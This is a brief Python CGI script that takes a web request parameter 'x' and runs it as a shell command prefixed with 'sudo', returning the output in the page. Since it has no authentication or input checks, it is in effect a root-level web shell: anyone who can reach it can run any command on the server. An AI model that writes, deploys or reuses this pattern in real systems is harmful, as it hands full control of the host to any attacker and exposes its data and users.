#!/usr/bin/python3

import cgi
import subprocess
import time

print("content-type: text/html")
print()


out = cgi.FieldStorage()
cmd = out.getvalue("x")

output = subprocess.getoutput("sudo " + cmd )
print(output)